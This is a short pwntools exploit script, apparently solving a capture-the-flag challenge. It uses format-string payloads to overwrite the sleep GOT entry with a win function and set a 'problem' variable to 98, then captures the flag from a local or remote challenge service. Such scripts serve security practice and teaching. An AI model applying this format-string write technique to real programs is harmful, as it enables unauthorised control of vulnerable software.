from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
r = ROP(e)

gs = '''
break *0x401284
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 29376)
    else:
        return process(e.path)


p = start()

got_write = {
    e.got['sleep']: e.sym['win'],
}

p.recvuntil(b'words that ryhme >>>')
payload = fmtstr_payload(6, got_write, write_size='short')
p.sendline(payload)
info('Overwrote GOT Entry For Sleep with Win()')

prob_write = {
    e.sym['problem']: 98,
}

p.recvuntil(b'words that ryhme >>>')
payload = fmtstr_payload(6, prob_write, write_size='short')
p.sendline(payload)
info('Overwrote Problem with Value = 98')

p.recvuntil(b' Congratulations:')
p.warn('Flag Captured')
p.interactive()
